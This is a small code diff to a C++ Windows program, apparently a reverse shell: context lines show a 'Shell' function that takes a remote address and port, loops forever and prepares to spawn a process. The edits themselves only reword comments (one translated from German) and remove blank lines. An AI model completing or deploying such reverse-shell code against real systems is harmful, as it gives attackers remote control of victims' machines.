@@ -11,9 +11,8 @@
 #include <locale>
 #include <codecvt>
 
-#pragma comment(lib, "Ws2_32.lib")  // statically compile this lib into the exe
+#pragma comment(lib, "Ws2_32.lib")  // statically link this lib
 #define DEFAULT_BUFLEN 1024
-
 
 void Shell(char* revAddr, int revPort) {
     while (true) {
@@ -48,9 +47,8 @@ void Shell(char* revAddr, int revPort) {
                 std::vector<wchar_t> vec(wProcess.begin(), wProcess.end());
                 vec.push_back(L'\0');
 
-                // Extrahiere wchar_t*
+                // Extract wchar_t*
                 LPWSTR lpwProcess = &vec[0];
-
 
                 STARTUPINFO startUpInf;
                 PROCESS_INFORMATION processInf;
